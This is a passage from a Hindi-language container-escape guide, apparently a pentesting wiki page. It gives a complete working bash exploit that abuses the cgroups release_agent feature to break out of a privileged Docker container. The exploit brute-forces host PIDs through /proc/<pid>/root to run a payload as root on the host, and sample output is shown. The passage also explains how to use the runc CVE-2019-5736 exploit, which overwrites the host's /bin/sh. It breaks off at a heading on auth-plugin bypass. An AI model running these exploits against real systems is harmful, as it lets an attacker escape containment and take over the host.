рдЕрдВрдд рдореЗрдВ, рд╣рдо "x" рдЪрд╛рдЗрд▓реНрдб cgroup рдХреЗ рдЕрдВрджрд░ рддреБрд░рдВрдд рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рд╡рд╛рд▓реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдХреЗ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред `/bin/sh` рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрдирд╛рдХрд░ рдФрд░ рдЙрд╕рдХреЗ PID рдХреЛ "x" рдЪрд╛рдЗрд▓реНрдб cgroup рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ `cgroup.procs` рдлрд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрдХрд░, рд╣реЛрд╕реНрдЯ рдкрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ `/bin/sh` рдХреЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рдмрд╛рдж рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧреАред рд╣реЛрд╕реНрдЯ рдкрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ `ps aux` рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ рдлрд┐рд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ `/output` рдлрд╛рдЗрд▓ рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
# `--privileged` flag v2

рдкрд┐рдЫрд▓реЗ PoCs рддрдм рдЕрдЪреНрдЫреЗ рд╕реЗ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ рдЬрдм рдХрдВрдЯреЗрдирд░ рдХреЛ рдПрдХ storage-driver рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдорд╛рдЙрдВрдЯ рдкреЙрдЗрдВрдЯ рдХреЗ рдкреВрд░реЗ рд╣реЛрд╕реНрдЯ рдкрде рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `overlayfs`, рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╣рд╛рд▓ рд╣реА рдореЗрдВ рдореИрдВ рдХреБрдЫ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рдиреЛрдВ рд╕реЗ рдорд┐рд▓рд╛ рдЬреЛ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рд╣реЛрд╕реНрдЯ рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдорд╛рдЙрдВрдЯ рдкреЙрдЗрдВрдЯ рдХреЛ рдкреНрд░рдХрдЯ рдирд╣реАрдВ рдХрд░рддреЗ рдереЗред

## Kata Containers
```
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
[Kata Containers](https://katacontainers.io) рдореВрд▓ рд░реВрдк рд╕реЗ рдХрдВрдЯреЗрдирд░ рдХреА рд░реВрдЯ рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЛ `9pfs` рдХреЗ рдКрдкрд░ рдорд╛рдЙрдВрдЯ рдХрд░рддрд╛ рд╣реИред рдпрд╣ Kata Containers рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрди рдореЗрдВ рдХрдВрдЯреЗрдирд░ рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд╕реНрдерд╛рди рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреЛрдИ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рдХрдЯ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред

\* Kata Containers рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рднрд╡рд┐рд╖реНрдп рдХреЗ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ рдореЗрдВред

## Device Mapper
```
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
рдореИрдВрдиреЗ рдПрдХ рд▓рд╛рдЗрд╡ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдЗрд╕ рд░реВрдЯ рдорд╛рдЙрдВрдЯ рдХреЗ рд╕рд╛рде рдПрдХ рдХрдВрдЯреЗрдирд░ рджреЗрдЦрд╛, рдореБрдЭреЗ рд╡рд┐рд╢реНрд╡рд╛рд╕ рд╣реИ рдХрд┐ рдХрдВрдЯреЗрдирд░ рд╡рд┐рд╢реЗрд╖ `devicemapper` рд╕реНрдЯреЛрд░реЗрдЬ-рдбреНрд░рд╛рдЗрд╡рд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рд╕рд╛рде рдЪрд▓ рд░рд╣рд╛ рдерд╛, рд▓реЗрдХрд┐рди рдЗрд╕ рд╕рдордп рдореИрдВ рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рдПрдХ рдкрд░реАрдХреНрд╖рдг рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рджреЛрд╣рд░рд╛рдиреЗ рдореЗрдВ рдЕрд╕рдорд░реНрде рд░рд╣рд╛ рд╣реВрдБред

## рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ PoC

рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдЗрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдкрд░реНрдпрд╛рдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ рдХрд┐ рд╣реЛрд╕реНрдЯ рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдХрдВрдЯреЗрдирд░ рдлрд╛рдЗрд▓реЛрдВ рдХрд╛ рдкрде рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛ рд╕рдХреЗ, рдЗрд╕рд▓рд┐рдП Felix рдХрд╛ PoC рдЬреИрд╕рд╛ рд╣реИ рд╡реИрд╕рд╛ рдЗрд╕реНрддреЗрдорд╛рд▓ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╣рдо рдереЛрдбрд╝реА рд╕реВрдЭрдмреВрдЭ рдХреЗ рд╕рд╛рде рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдЕрднреА рднреА рдЕрдВрдЬрд╛рдо рджреЗ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрд╡рд╢реНрдпрдХ рдПрдХ рдореБрдЦреНрдп рдЬрд╛рдирдХрд╛рд░реА рдпрд╣ рд╣реИ рдХрд┐ рдХрдВрдЯреЗрдирд░ рд╣реЛрд╕реНрдЯ рдХреЗ рд╕рд╛рдкреЗрдХреНрд╖ рдкреВрд░реНрдг рдкрде, рдПрдХ рдлрд╛рдЗрд▓ рдХрд╛ рдЬрд┐рд╕реЗ рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╣реИред рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рдорд╛рдЙрдВрдЯ рдкреЙрдЗрдВрдЯреНрд╕ рд╕реЗ рдЗрд╕реЗ рд╕рдордЭрдиреЗ рдореЗрдВ рдЕрд╕рдорд░реНрде рд╣реЛрдиреЗ рдХреЗ рдХрд╛рд░рдг рд╣рдореЗрдВ рдФрд░ рдЬрдЧрд╣ рджреЗрдЦрдирд╛ рд╣реЛрдЧрд╛ред

### Proc рд╕реЗ рдорджрдж <a href="proc-to-the-rescue" id="proc-to-the-rescue"></a>

рд▓рд┐рдирдХреНрд╕ `/proc` рдкреНрд╕реНрдпреВрдбреЛ-рдлрд╛рдЗрд▓рд╕рд┐рд╕реНрдЯрдо рдПрдХ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдЪрд▓ рд░рд╣реЗ рд╕рднреА рдкреНрд░реЛрд╕реЗрд╕ рдХреЗ рдХрд░реНрдиреЗрд▓ рдкреНрд░реЛрд╕реЗрд╕ рдбреЗрдЯрд╛ рд╕рдВрд░рдЪрдирд╛рдУрдВ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рдирдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рдиреЗрдорд╕реНрдкреЗрд╕ рдореЗрдВ рдЪрд▓ рд░рд╣реЗ рдкреНрд░реЛрд╕реЗрд╕ рднреА рд╢рд╛рдорд┐рд▓ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ред рдЗрд╕реЗ рдПрдХ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдПрдХ рдХрдорд╛рдВрдб рдЪрд▓рд╛рдХрд░ рдФрд░ рд╣реЛрд╕реНрдЯ рдкрд░ рдкреНрд░реЛрд╕реЗрд╕ рдХреА `/proc` рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рддрдХ рдкрд╣реБрдБрдЪрдХрд░ рджрд┐рдЦрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:Container
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
_рдПрдХ рддрд░рдл, `/proc/<pid>/root` рдбреЗрдЯрд╛ рд╕рдВрд░рдЪрдирд╛ рдПрдХ рдРрд╕реА рдЪреАрдЬ рд╣реИ рдЬрд┐рд╕рдиреЗ рдореБрдЭреЗ рдмрд╣реБрдд рд▓рдВрдмреЗ рд╕рдордп рддрдХ рднреНрд░рдорд┐рдд рдХрд┐рдпрд╛, рдореИрдВ рдХрднреА рдирд╣реАрдВ рд╕рдордЭ рдкрд╛рдпрд╛ рдХрд┐ `/` рдХреЗ рд▓рд┐рдП рдПрдХ рдкреНрд░рддреАрдХрд╛рддреНрдордХ рд▓рд┐рдВрдХ рд╣реЛрдирд╛ рдХреНрдпреЛрдВ рдЙрдкрдпреЛрдЧреА рдерд╛, рдЬрдм рддрдХ рдХрд┐ рдореИрдВрдиреЗ рдореИрди рдкреЗрдЬреЗрд╕ рдореЗрдВ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдкрд░рд┐рднрд╛рд╖рд╛ рдирд╣реАрдВ рдкрдврд╝реА:_

> /proc/\[pid]/root
>
> UNIX рдФрд░ Linux рдлрд╛рдЗрд▓рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдкреНрд░рддрд┐-рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд░реВрдЯ рдХреЗ рд╡рд┐рдЪрд╛рд░ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВ, рдЬрд┐рд╕реЗ chroot(2) рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рджреНрд╡рд╛рд░рд╛ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдлрд╛рдЗрд▓ рдПрдХ рдкреНрд░рддреАрдХрд╛рддреНрдордХ рд▓рд┐рдВрдХ рд╣реИ рдЬреЛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд░реВрдЯ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИ, рдФрд░ exe рдФрд░ fd/\* рдХреЗ рд╕рдорд╛рди рддрд░реАрдХреЗ рд╕реЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рддрд╛ рд╣реИред
>
> рд╣рд╛рд▓рд╛рдВрдХрд┐, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдлрд╛рдЗрд▓ рдХреЗрд╡рд▓ рдПрдХ рдкреНрд░рддреАрдХрд╛рддреНрдордХ рд▓рд┐рдВрдХ рдирд╣реАрдВ рд╣реИред рдпрд╣ рдлрд╛рдЗрд▓рд╕рд┐рд╕реНрдЯрдо рдХрд╛ рд╡рд╣реА рджреГрд╢реНрдп рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ (рд╕рд╣рд┐рдд namespaces рдФрд░ рдкреНрд░рддрд┐-рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдорд╛рдЙрдВрдЯреНрд╕ рдХрд╛ рд╕реЗрдЯ) рдЬреИрд╕рд╛ рдХрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реНрд╡рдпрдВред

`/proc/<pid>/root` рдкреНрд░рддреАрдХрд╛рддреНрдордХ рд▓рд┐рдВрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рд╕реА рднреА рдлрд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП рд╣реЛрд╕реНрдЯ рд╕рд╛рдкреЗрдХреНрд╖ рдкрде рдХреЗ рд░реВрдк рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдХрд┐ рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рд╣реИ:Container
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
рдЗрд╕рд╕реЗ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХрддрд╛ рдмрджрд▓ рдЬрд╛рддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдХрдВрдЯреЗрдирд░ рд╣реЛрд╕реНрдЯ рдХреЗ рд╕рд╛рдкреЗрдХреНрд╖ рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рдПрдХ рдлрд╛рдЗрд▓ рдХреЗ рдкреВрд░реНрдг рдкрде рдХреЛ рдЬрд╛рдирдиреЗ рд╕реЗ рд▓реЗрдХрд░ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдЪрд▓ рд░рд╣реА _рдХрд┐рд╕реА рднреА_ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ pid рдХреЛ рдЬрд╛рдирдиреЗ рддрдХ рдХреА рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрддреА рд╣реИред

### Pid Bashing <a href="pid-bashing" id="pid-bashing"></a>

рдпрд╣ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЖрд╕рд╛рди рд╣рд┐рд╕реНрд╕рд╛ рд╣реИ, Linux рдореЗрдВ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЖрдИрдбреА рд╕рдВрдЦреНрдпрд╛рддреНрдордХ рд╣реЛрддреА рд╣реИ рдФрд░ рдХреНрд░рдорд┐рдХ рд░реВрдк рд╕реЗ рдЕрд╕рд╛рдЗрди рдХреА рдЬрд╛рддреА рд╣реИред `init` рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЖрдИрдбреА `1` рдЕрд╕рд╛рдЗрди рдХреА рдЬрд╛рддреА рд╣реИ рдФрд░ рд╕рднреА рдмрд╛рдж рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдмрдврд╝рддреА рд╣реБрдИ рдЖрдИрдбреА рджреА рдЬрд╛рддреА рд╣реИред рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рдХрд┐рд╕реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рд╣реЛрд╕реНрдЯ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЖрдИрдбреА рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХреНрд░рдорд┐рдХ рдЦреЛрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:Container
```
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
рдореЗрдЬрд╝рдмрд╛рди
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
### рд╕рднреА рдХреЛ рдПрдХ рд╕рд╛рде рд░рдЦрддреЗ рд╣реБрдП <a href="putting-it-all-together" id="putting-it-all-together"></a>

рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП brute force рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `/proc/<pid>/root/payload.sh` рдкрде рдХреЗ рд▓рд┐рдП pid рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдкреНрд░рддреНрдпреЗрдХ рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рдореЗрдВ рдЕрдиреБрдорд╛рдирд┐рдд pid рдкрде рдХреЛ cgroups `release_agent` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, `release_agent` рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рджреЗрдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдПрдХ рдЖрдЙрдЯрдкреБрдЯ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдИ рдЧрдИ рд╣реИред

рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рд╕рд╛рде рдПрдХрдорд╛рддреНрд░ рд╕рд╛рд╡рдзрд╛рдиреА рдпрд╣ рд╣реИ рдХрд┐ рдпрд╣ рдХрд┐рд╕реА рднреА рддрд░рд╣ рд╕реЗ рд╕реВрдХреНрд╖реНрдо рдирд╣реАрдВ рд╣реИ, рдФрд░ pid рдХреА рдЧрд┐рдирддреА рдХреЛ рдмрд╣реБрдд рдЕрдзрд┐рдХ рдмрдврд╝рд╛ рд╕рдХрддрд╛ рд╣реИред рдЪреВрдВрдХрд┐ рдХреЛрдИ рднреА рд▓рдВрдмреЗ рд╕рдордп рддрдХ рдЪрд▓рдиреЗ рд╡рд╛рд▓реА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ рдЪрд▓рддреА рдирд╣реАрдВ рд░рд╣рддреА рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЗрд╕реЗ _рдЪрд╛рд╣рд┐рдП_ рдХреЛрдИ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдпрддрд╛ рд╕рдорд╕реНрдпрд╛рдПрдВ рдкреИрджрд╛ рдирд╣реАрдВ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП, рд▓реЗрдХрд┐рди рдЗрд╕ рдкрд░ рдореЗрд░реЗ рд╢рдмреНрджреЛрдВ рдХреЛ рдЙрджреНрдзреГрдд рди рдХрд░реЗрдВред

рдиреАрдЪреЗ рджрд┐рдпрд╛ рдЧрдпрд╛ PoC рдЗрди рддрдХрдиреАрдХреЛрдВ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ Felix рдХреЗ рдореВрд▓ PoC рдореЗрдВ рдкрд╣рд▓реА рдмрд╛рд░ рдкреНрд░рд╕реНрддреБрдд рдХреА рдЧрдИ рддреБрд▓рдирд╛ рдореЗрдВ рдПрдХ рдЕрдзрд┐рдХ рд╕рд╛рдорд╛рдиреНрдп рд╣рдорд▓рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдЬреЛ рдХрд┐ cgroups `release_agent` рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреНрдб рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ PoC рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдкрд░ рдЖрдкрдХреЛ рдЗрд╕реА рдкреНрд░рдХрд╛рд░ рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ рдорд┐рд▓рдирд╛ рдЪрд╛рд╣рд┐рдП:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# Runc exploit (CVE-2019-5736)

рдпрджрд┐ рдЖрдк root рдХреЗ рд░реВрдк рдореЗрдВ `docker exec` рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рд╕рдВрднрд╡рддрдГ sudo рдХреЗ рд╕рд╛рде), рддреЛ рдЖрдк CVE-2019-5736 рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдХрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (exploit [рдпрд╣рд╛рдБ](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). рдпрд╣ рддрдХрдиреАрдХ рдореВрд▓ рд░реВрдк рд╕реЗ **host** рдХреЗ _**/bin/sh**_ рдмрд╛рдЗрдирд░реА рдХреЛ **рдХрдВрдЯреЗрдирд░ рд╕реЗ** **рдУрд╡рд░рд░рд╛рдЗрдЯ** рдХрд░реЗрдЧреА, рдЗрд╕рд▓рд┐рдП рдХреЛрдИ рднреА рдЬреЛ docker exec рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ, рд╡рд╣ рдкреЗрд▓реЛрдб рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдкреЗрд▓реЛрдб рдХреЛ рдЕрдиреБрд╕рд╛рд░ рдмрджрд▓реЗрдВ рдФрд░ `go build main.go` рдХреЗ рд╕рд╛рде main.go рдХреЛ рдмрд┐рд▓реНрдб рдХрд░реЗрдВред рдкрд░рд┐рдгрд╛рдореА рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд▓рд┐рдП рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд░рдЦрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред\
рдирд┐рд╖реНрдкрд╛рджрди рдкрд░, рдЬреИрд╕реЗ рд╣реА рдпрд╣ `[+] Overwritten /bin/sh successfully` рджрд┐рдЦрд╛рддрд╛ рд╣реИ, рдЖрдкрдХреЛ рд╣реЛрд╕реНрдЯ рдорд╢реАрди рд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛:

`docker exec -it <container-name> /bin/sh`

рдпрд╣ main.go рдлрд╛рдЗрд▓ рдореЗрдВ рдореМрдЬреВрдж рдкреЗрд▓реЛрдб рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдЧрд╛ред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

# Docker Auth Plugin Bypass

